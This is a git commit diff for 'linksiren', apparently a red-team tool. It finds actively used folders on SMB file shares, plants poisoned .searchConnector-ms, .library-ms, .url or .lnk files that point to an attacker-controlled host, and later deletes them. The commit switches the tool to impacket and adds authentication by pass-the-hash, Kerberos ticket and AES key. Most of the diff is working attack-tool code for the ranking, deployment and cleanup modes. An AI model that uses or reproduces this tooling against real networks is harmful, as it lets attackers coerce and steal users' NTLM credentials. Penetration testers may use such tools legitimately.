5ca8506a53c45a0af73e0f2946ef1e6514f28a28
unknown <georgejosephhamilton@gmail.com>
2024-03-23 22:08:26 -0400

    Main Features Wroking
    Generate, Rank, Identify, Deploy, and Cleanup functioning with impacket.

--- src/linksiren/__main__.py
+++ src/linksiren/__main__.py
@@ -9,8 +9,8 @@ import json
 import argparse
 from datetime import datetime
 from pathlib import Path
-from smbclient import ClientConfig
-from linksiren.impure_functions import read_targets, get_sorted_rankings, write_payload_remote, write_payload_local, delete_payload, write_list_to_file, get_lnk_template
+from impacket.examples.utils import parse_credentials
+from linksiren.impure_functions import read_targets, get_sorted_rankings, write_payload_local, write_list_to_file, get_lnk_template
 from linksiren.pure_functions import filter_targets, is_valid_payload_name, create_lnk_payload, compute_threshold_date
 
 def main():
@@ -39,12 +39,7 @@ def main():
     # Arguments for outputting rankings of potential folders into which to place poisoned files
     rank_parser = subparsers.add_parser('rank', help='Output identified subfolders and rankings to folder_rankings.txt')
     rank_required_group = rank_parser.add_argument_group('Required Arguments')
-    rank_required_group.add_argument('-u', '--username', required=True, help='Username for authenticating to each '
-                        'share')
-    rank_required_group.add_argument('-p', '--password', required=True, help='Password for authenticating to each '
-                        'share')
-    rank_required_group.add_argument('-d', '--domain', required=True, help='Domain for authenticating to each share.'
-                        'Specify "." for local authentication')
+    rank_required_group.add_argument('credentials', help='[domain/]username[:password] for authentication')
     rank_required_group.add_argument('-t', '--targets', required=True,
                         help='Path to a text file containing UNC paths to file shares / base '
                         'directories within which to rank folders as potential locations for placing'
@@ -56,17 +51,23 @@ def main():
     rank_parser.add_argument('-f', '--fast', action='store_true', default=False, help='(Default: False) Mark folders active as'
                         ' soon as one active file in them is identified and move on. Ranks are '
                         'all set to 1 assigned.')
+    rank_parser.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
+    rank_parser.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
+    rank_parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
+                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
+                             ' the ones specified in the command line')
+    rank_parser.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
+                                                                            ' (128 or 256 bits)')
+    rank_parser.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
+    rank_parser.add_argument_group('connection')
+    rank_parser.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
+                                 'ommited it use the domain part (FQDN) specified in the target parameter')
 
     # Arguments for identifying and outputting UNC paths to optimal folders into which to place poisoned files
     idenitfy_parser = subparsers.add_parser('identify', help='Identify target folders for payload distribution '
                                             'and output to folder_targets.txt')
     identify_required_group = idenitfy_parser.add_argument_group('Required Arguments')
-    identify_required_group.add_argument('-u', '--username', required=True, help='Username for authenticating to each '
-                        'share')
-    identify_required_group.add_argument('-p', '--password', required=True, help='Password for authenticating to each '
-                        'share')
-    identify_required_group.add_argument('-d', '--domain', required=True, help='Domain for authenticating to each share.'
-                        'Specify "." for local authentication')
+    identify_required_group.add_argument('credentials', help='[domain/]username[:password] for authentication')
     identify_required_group.add_argument('-t', '--targets', required=True,
                         help='Path to a text file containing UNC paths to file shares / base '
                         'directories for deployment or from which to remove payload files')
@@ -80,17 +81,23 @@ def main():
     idenitfy_parser.add_argument('-mf', '--max-folders-per-target', type=int, default=10, help='(Default: 10) Maximum number of '
                             'folders to output as deployment targets per supplied target share or '
                             'folder.')
+    idenitfy_parser.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
+    idenitfy_parser.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
+    idenitfy_parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
+                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
+                             ' the ones specified in the command line')
+    idenitfy_parser.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
+                                                                            ' (128 or 256 bits)')
+    idenitfy_parser.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
+    idenitfy_parser.add_argument_group('connection')
+    idenitfy_parser.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
+                                 'ommited it use the domain part (FQDN) specified in the target parameter')
 
     # Arguments for deploying poisoned files to specified locations
     deploy_parser = subparsers.add_parser('deploy', help='Deploy payloads to all folder UNC '
                         'paths listed one per line in the file specified using --targets')
     deploy_required_group = deploy_parser.add_argument_group('Required Arguments')
-    deploy_required_group.add_argument('-u', '--username', required=True, help='Username for authenticating to each '
-                        'share')
-    deploy_required_group.add_argument('-p', '--password', required=True, help='Password for authenticating to each '
-                        'share')
-    deploy_required_group.add_argument('-d', '--domain', required=True, help='Domain for authenticating to each share.'
-                        'Specify "." for local authentication')
+    deploy_required_group.add_argument('credentials', help='[domain/]username[:password] for authentication')
     deploy_required_group.add_argument('-t', '--targets', required=True,
                         help='Path to a text file containing UNC paths to folders into which poisoned '
                          'files will be deployed.')
@@ -98,27 +105,46 @@ def main():
                         'files.')
     deploy_parser.add_argument('-n', '--payload', default='@Test_Do_Not_Remove.searchConnector-ms', help='(Default: @Test_Do_Not_Remove.searchConnector-ms) Name '
                             'of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url')
+    deploy_parser.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
+    deploy_parser.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
+    deploy_parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
+                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
+                             ' the ones specified in the command line')
+    deploy_parser.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
+                                                                            ' (128 or 256 bits)')
+    deploy_parser.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
+    deploy_parser.add_argument_group('connection')
+    deploy_parser.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
+                                 'ommited it use the domain part (FQDN) specified in the target parameter')
+
 
     # Arguments for cleaning up deployed payloads when finished
     cleanup_parser = subparsers.add_parser('cleanup', help='Delete poisoned files from folder UNC paths'
                                            'specified in --targets')
     cleanup_required_group = cleanup_parser.add_argument_group('Required Arguments')
-    cleanup_required_group.add_argument('-u', '--username', required=True, help='Username for authenticating to each '
-                        'share')
-    cleanup_required_group.add_argument('-p', '--password', required=True, help='Password for authenticating to each '
-                        'share')
-    cleanup_required_group.add_argument('-d', '--domain', required=True, help='Domain for authenticating to each share.'
-                        'Specify "." for local authentication')
+    cleanup_required_group.add_argument('credentials', help='[domain/]username[:password] for authentication')
     cleanup_required_group.add_argument('-t', '--targets', required=True,
                         help='Path to a text file containing UNC paths to folders in which poisoned '
                          'files are located.')
-    cleanup_required_group.add_argument('-a', '--attacker', required=True, help='Attacker IP or hostname to place in poisoned '
-                        'files.')
     cleanup_parser.add_argument('-n', '--payload', default='@Test_Do_Not_Remove.searchConnector-ms', help='(Default: @Test_Do_Not_Remove.searchConnector-ms) Name '
                             'of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url')
+    cleanup_parser.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
+    cleanup_parser.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
+    cleanup_parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
+                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
+                             ' the ones specified in the command line')
+    cleanup_parser.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
+                                                                            ' (128 or 256 bits)')
+    cleanup_parser.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
+    cleanup_parser.add_argument_group('connection')
+    cleanup_parser.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
+                                 'ommited it use the domain part (FQDN) specified in the target parameter')
+
 
     # Parse arguments
     args = parser.parse_args()
+    if 'credentials' in args:
+        domain, username, password = parse_credentials(args.credentials)
 
     available_extensions = ['.searchConnector-ms', '.library-ms', '.url', '.lnk']
 
@@ -146,38 +172,35 @@ def main():
         write_payload_local(args.payload, payload_contents)
 
     elif args.mode == 'rank': # If rank functionality is used to rank active folders
-        # Setup default login credentials
-        ClientConfig(username=f'{args.domain}\\{args.username}', password=args.password)
+        threshold_date = compute_threshold_date(datetime.now(), args.active_threshold)
 
         # Read share targets into an array
         targets = read_targets(args.targets)
 
-        sorted_rankings = get_sorted_rankings(targets, args.active_threshold, args.max_depth,
-                                              args.fast)
+        sorted_rankings = get_sorted_rankings(targets, domain, username, password,
+                                              threshold_date, args.max_depth, args.fast)
 
         # Write all reviewed subfolders and their rankings to a file
-        with open('folder_rankings', mode='w', encoding="utf-8") as f:
+        with open('folder_rankings.txt', mode='w', encoding="utf-8") as f:
             f.write(json.dumps(sorted_rankings, indent=4, sort_keys=False))
 
     elif args.mode == 'identify':  # Else if identification functionality is used to identify active folders
-        # Setup default login credentials
-        ClientConfig(username=f'{args.domain}\\{args.username}', password=args.password)
+        threshold_date = compute_threshold_date(datetime.now(), args.active_threshold)
 
         # Read share targets into an array
         targets = read_targets(args.targets)
 
-        threshold_date = compute_threshold_date(datetime.now(), args.active_threshold)
+        sorted_rankings = get_sorted_rankings(targets=targets, domain=domain, username=username, password=password,
+                            active_threshold_date=threshold_date, max_depth=args.max_depth, go_fast=args.fast)
 
-        sorted_rankings = get_sorted_rankings(targets, threshold_date, args.max_depth,
-                                              args.fast)
+        print(sorted_rankings)
         filtered_targets = filter_targets(targets, sorted_rankings, args.max_folders_per_target)
+        print(filtered_targets)
 
         # Write the highest ranked active shares to folder_targets.txt for review and deployment
         write_list_to_file(filtered_targets, 'folder_targets.txt')
 
     elif args.mode == 'deploy':  # Else if the deploy functionality is used to deploy payloads
-        # Setup default login credentials
-        ClientConfig(username=f'{args.domain}\\{args.username}', password=args.password)
 
         # Read share targets into an array
         targets = read_targets(args.targets)
@@ -190,7 +213,7 @@ def main():
 
         # Select a template file name based on the payload name
         payload_extension = Path(args.payload).suffix
-        template_path = Path(__file__).parent / f'template.{payload_extension}'
+        template_path = Path(__file__).parent / f'template{payload_extension}'
 
         if payload_extension == '.lnk':
             lnk_template = get_lnk_template(template_path)
@@ -204,25 +227,25 @@ def main():
                 payload_contents = template_contents.format(attacker_ip=args.attacker)
 
         # Iterate over each target folder path
-        for folder_unc in targets:
-            # Attempt to write a paylaod to each location
-            write_successful = write_payload_remote(folder_unc, args.payload, payload_contents)
-            if write_successful:
-                payloads_written.append(folder_unc)
+        for target in targets:
+            target.connect(user=username, password=password, domain=domain)
+            for path in target.paths:
+                write_successful = target.write_payload(path=path, payload_name=args.payload, payload=payload_contents)
+                if write_successful is True:
+                    payloads_written.append(f'\\\\{target.host}\\{path}')
 
         # Save the list of payloads successfully written for easy cleanup
         write_list_to_file(payloads_written, 'payloads_written.txt', 'a')
 
     elif args.mode == 'cleanup':  # Else if the cleanup functionality is used to delete deployed payloads
-        # Setup default login credentials
-        ClientConfig(username=f'{args.domain}\\{args.username}', password=args.password)
-
         # Read share targets into an array
         targets = read_targets(args.targets)
 
         # Iterate over each folder where payloads were deployed
-        for payload_folder in targets:
-            # Delete the payload at the specified path
-            delete_payload(payload_folder, args.payload)
+        for target in targets:
+            target.connect(user=username, password=password, domain=domain)
+            for path in target.paths:
+                # Delete the payload at the specified path
+                target.delete_payload(path, args.payload)
 
 main()
--- src/linksiren/impure_functions.py
+++ src/linksiren/impure_functions.py
@@ -6,10 +6,7 @@ deploy multiple types of payloads to the identified locations. Lastly, this modu
 bulk cleanup multiple types of payloads from the identified locations.
 """
 from pathlib import Path
-from smbclient import scandir, remove, open_file
-from smbprotocol.exceptions import SMBException
-from linksiren.pure_functions import is_active_file, sort_rankings
-
+import linksiren.pure_functions
 
 def write_payload_local(payload_name, payload_contents):
     """
@@ -38,8 +35,8 @@ def write_payload_local(payload_name, payload_contents):
         try:  # Try to write the payload
             with open(payload_name, mode='w', newline='\r\n') as payload_file:
                 payload_file.write(payload_contents)
-        except:  # Print a message and don't track the folder if writing the payload to it fails
-            print(f'Failed to write payload at: {payload_name}')
+        except Exception as e:  # Print a message and don't track the folder if writing the payload to it fails
+            print(f'Failed to write payload at: {payload_name}\n\t{e}')
             return False
 
     # If writing the payload doesn't fail, then return True
@@ -57,79 +54,23 @@ def read_targets(targets_file):
     Reads in a list of targets from a specified file path and returns a list of targets.
     Catches an exception and prints an error if the targets file does not exist.
     """
-    targets = []
+    target_unc_paths = []
 
     # Read share targets into an array
     try:
         with open(targets_file, 'r', encoding="utf-8") as file:
-            targets = file.read().splitlines()
-    except:
+            target_unc_paths = file.read().splitlines()
+    except Exception as e:
         print('Error opening targets file. Make sure it exists and review its permissions.')
+        print(e)
 
-    return targets
-
-
-def review_folder(folder_rankings, unc_path, active_threshold_date, depth, fast):
-    """
-    review_folder(folder_rankings, unc_path, active_threshold, depth, fast)
-
-    :param dict folder_rankings: Dictionary of folder UNC paths and rankings reflecting the number
-    of active files in the folder. {<folder UNC path>: <ranking>}
-    :param str unc_path: UNC path for the current folder being reviewed
-    :param int active_threshold: Number of days within which file access constitutes a file being
-    active
-    :param int depth: Number of layers of folders to search. 1 searches only the specified folder
-    and none of its subfolders.
-    :param bool fast: If True, the current folder will be marked as active as soon as a single file
-    is found. A rank of 1 will be assigned to all active folders.
-
-    :return: Dictionary of folder UNC paths as keys and rankings as values
-
-    Iterates over files and subfolders starting at the specified UNC path up to the
-    specified depth. Each folder is assigned a rank, tracked in folder rankings by its
-    UNC path, based on the number of active files it contains. Active files are files
-    accessed within the number of days specified in active threshold. If fast is set
-    to True, then the folder will receive a rank of 1 or 0 depending on if it contains
-    at least one active file or none.
-    """
-    ranking = 0
-    folders = []
-    reviewed = False
-    depth_reached = depth <= 1
-
-    # Use scandir as a more efficient directory listing as it already contains info like stat and
-    # attributes.
-    for file_info in scandir(unc_path):
-        reviewed = fast and ranking > 0 # Review completed if in fast and ranking is non-zero
-
-        # If folder is active and max_depth is reached
-        if reviewed and depth_reached:
-            break  # Stop reviewing items in the folder
-
-        # For active files in the directory when the review is not yet completed
-        elif not reviewed and file_info.is_file() and is_active_file(file_info.stat().st_atime, active_threshold_date):
-            ranking += 1 # Increment the folder ranking
-
-        # For subfolders in the directory
-        elif file_info.is_dir() and not depth_reached: # If max depth is not reached
-            folders.append(f'{unc_path}\\{file_info.name}')
-
-    # Recursion: Call this function on all subfolders to review them if max depth is not reached.
-    # Update folder_rankings as each subfolder is reviewed.
-    if not depth_reached:  # If the max depth has not been reached
-        for subfolder_unc in folders:
-            folder_rankings = {**folder_rankings, **review_folder(folder_rankings, subfolder_unc,
-                                                              active_threshold_date, depth - 1, fast)}
-            # Requires python 3.9 or greater, commented for >= python 3.5 compatability
-            # folder_rankings = folder_rankings | review_folder(folder_rankings, subfolder_unc,
-            #                                                  active_threshold_date, depth - 1, fast)
-
-    # Update folder_rankings with the rank of the current folder and return it
-    folder_rankings[unc_path] = ranking
-    return folder_rankings
+    return linksiren.pure_functions.process_targets(target_unc_paths)
 
 
-def get_rankings(targets, active_threshold_date, max_depth, go_fast):
+# Eventually we should just pass the whole parsed arguments structure to different functions
+# And then modify behaviors by checking options for things like active_threshold_date, max_depth
+# creds/ntlm hash, go_fast, etc.
+def get_rankings(targets, domain, username, password, active_threshold_date, max_depth, go_fast):
     """
     get_sorted_rankings(targets, active_threshold, max_depth, go_fast)
 
@@ -154,24 +95,30 @@ def get_rankings(targets, active_threshold_date, max_depth, go_fast):
     # Track rankings for each folder, which are (counterintuitively) scores corresponding to the
     # number of active files in a folder. {<folder UNC path>: <ranking>}
     folder_rankings = {}
-    for share in targets:
+
+    for target in targets:
+        if target.connection is None:
+            try:
+                target.connect(user=username, password=password, domain=domain)
+            except Exception as e:
+                print(f"Error connecting to {target.host}: {e}")
+
         try:
             # Call the appropriate review function based on the fast argument
-            folder_rankings = review_folder(folder_rankings, share, active_threshold_date,max_depth,
+            folder_rankings = target.review_all_folders(folder_rankings, active_threshold_date, max_depth,
                                             go_fast)
-
-        except SMBException as e:
-            print(f"Error connecting to {share}: {e}")
+        except Exception as e:
+            print(f"Error connecting to shares on {target.host}: {e}")
 
     return folder_rankings
 
 
-def get_sorted_rankings(targets, active_threshold_date, max_depth, go_fast):
+def get_sorted_rankings(targets, domain, username, password, active_threshold_date, max_depth, go_fast):
     # Get rankings for folders
-    folder_rankings = get_rankings(targets, active_threshold_date, max_depth, go_fast)
+    folder_rankings = get_rankings(targets, domain, username, password, active_threshold_date, max_depth, go_fast)
 
     # Sort the folder UNC paths by rankings
-    sorted_rankings = sort_rankings(folder_rankings)
+    sorted_rankings = linksiren.pure_functions.sort_rankings(folder_rankings)
     return sorted_rankings
 
 
@@ -189,65 +136,6 @@ def write_list_to_file(input_list, file_path, mode='w'):
     with open(file_path, mode=mode, encoding="utf-8") as f:
         for item in input_list:
             f.write(item + '\n')
-
-
-def write_payload_remote(folder_unc, payload_name, payload_contents):
-    """
-    write_payload_remote(folder_unc, payload_name, payload_contents)
-
-    :param str folder_unc: UNC folder path to which the payload should be written
-    :param str payload_name: File name, including extension, of the payload
-    :param str payload_contents: Contents to write to the payload file
-
-
-    :return: A bool indicateing whether or not the payload was written successfully.
-
-    Accepts a fold UNC path, payload name, and payload contents. Writes the supplied contents
-    to the specified file and folder. Returns a bool indicating if the payload was written
-    successfully.
-    """
-    payload_unc = f'{folder_unc}\\{payload_name}'
-    extension = Path(payload_name).suffix
-
-    if extension == '.lnk':
-        try:  # Try to write the payload
-            with open_file(payload_unc, mode='wb') as payload_file:
-                payload_file.write(payload_contents)
-        except:  # Print a message and don't track the folder if writing the payload to it fails
-            print(f'Failed to write payload at: {payload_unc}')
-            return False
-    else:
-        try:  # Try to write the payload
-            with open_file(payload_unc, mode='w', newline='\r\n') as payload_file:
-                payload_file.write(payload_contents)
-        except:  # Print a message and don't track the folder if writing the payload to it fails
-            print(f'Failed to write payload at: {payload_unc}')
-            return False
-
-    # If writing the payload doesn't fail, then return True
-    return True
-
-
-def delete_payload(payload_folder, payload_name):
-    """
-    delete_payload(folder_unc, payload_name, payload_contents)
-
-    :param str payload_folder: UNC path to a folder containing a paylaod
-    :param str payload_name: File name, including extension, of the payload
-
-    :return: A bool indicateing whether or not the payload was deleted successfully.
-
-    Accepts a payload folder and payload name. Attempts to delete the payload from
-    from the specified folder. Returns a bool indicating if the payload was written
-    successfully.
-    """
-    payload_unc = f'{payload_folder}\\{payload_name}'
-    try:  # Try to delete the payload file
-        remove(payload_unc)
-    except:  # Print a message if deletion fails
-        print(f'Failed to delete payload at: {payload_unc}')
-        return False
-    return True
 
 
 def get_lnk_template(template_path):
